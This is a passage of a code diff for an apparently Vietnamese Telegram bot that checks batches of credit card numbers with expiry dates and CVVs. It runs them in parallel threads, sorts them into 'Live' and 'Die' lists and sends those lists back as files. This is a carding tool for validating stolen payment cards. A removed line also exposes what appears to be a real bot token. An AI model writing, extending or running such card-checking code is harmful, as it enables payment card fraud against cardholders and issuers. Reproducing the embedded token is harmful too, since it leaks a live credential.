+        final_str = f"{cc}|{mes}|{ano}|{cvv}|{result_msg}"
+
+        if status == "LIVE":
+            task.live += 1
+            task.live_lines.append(final_str)
+        elif status == "DIE":
+            task.die += 1
+            task.die_lines.append(final_str)
+        else:
+            task.error += 1
+        
+        task.checked += 1
+
+    # Chạy ThreadPool
+    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
+        executor.map(worker, lines)
+    
+    # Kết thúc
+    task.is_running = False
+    time.sleep(1) # Chờ updater chạy lần cuối
     
     # Gửi kết quả cuối cùng
-    await status_msg.edit_text("✅ **Hoàn tất kiểm tra!** Đang gửi file...", parse_mode=ParseMode.MARKDOWN)
+    try:
+        # Ghi file
+        live_file = f"Live_{chat_id}.txt"
+        die_file = f"Die_{chat_id}.txt"
+        
+        with open(live_file, "w", encoding="utf-8") as f:
+            f.write("\n".join(task.live_lines))
+            
+        with open(die_file, "w", encoding="utf-8") as f:
+            f.write("\n".join(task.die_lines))
+        
+        bot.send_message(chat_id, "✅ *Check Complete!* Sending files...", parse_mode="Markdown")
+        
+        if task.live > 0:
+            with open(live_file, "rb") as f:
+                bot.send_document(chat_id, f, caption=f"✅ Live Cards: {task.live}")
+        
+        with open(die_file, "rb") as f:
+            bot.send_document(chat_id, f, caption=f"❌ Die Cards: {task.die}")
+            
+        # Dọn dẹp
+        os.remove(live_file)
+        os.remove(die_file)
+        os.remove(filename)
+        del tasks[chat_id]
 
-    # Tạo file Live
-    if session_stats['live_list']:
-        live_content = "\n".join(session_stats['live_list'])
-        with open("Live.txt", "w", encoding="utf-8") as f:
-            f.write(live_content)
-        await update.message.reply_document(document=InputFile("Live.txt"), caption=f"✅ Live Cards ({len(session_stats['live_list'])})")
-        os.remove("Live.txt")
-    
-    # Tạo file Die (nếu cần, thường user chỉ cần Live, nhưng yêu cầu là gửi file)
-    if session_stats['die_list']:
-         # Để tránh spam file quá nặng, chỉ gửi nếu < 5MB hoặc gửi dưới dạng summary. 
-         # Ở đây gửi luôn theo yêu cầu.
-        die_content = "\n".join(session_stats['die_list'])
-        with open("Die.txt", "w", encoding="utf-8") as f:
-            f.write(die_content)
-        await update.message.reply_document(document=InputFile("Die.txt"), caption=f"💀 Die Cards ({len(session_stats['die_list'])})")
-        os.remove("Die.txt")
+    except Exception as e:
+        bot.send_message(chat_id, f"Lỗi gửi file: {e}")
 
-# ===================================================================
-# === MAIN EXECUTION
-# ===================================================================
-
-if __name__ == '__main__':
-    if BOT_TOKEN == "8110946929:AAGFn8gap9gMHH4_pABitcNd-saTGl24g0I":
-        print("LỖI: Chưa nhập Token Bot!")
-        sys.exit()
-
-    app = ApplicationBuilder().token(BOT_TOKEN).build()
-
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("st", check_single_card))
-    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_document))
-
-    print("Bot đang chạy...")
-    app.run_polling()
+# ==============================================================================
+# MAIN LOOP
+# ==============================================================================
+if __name__ == "__main__":
+    print("Bot is running...")
+    bot.infinity_polling()
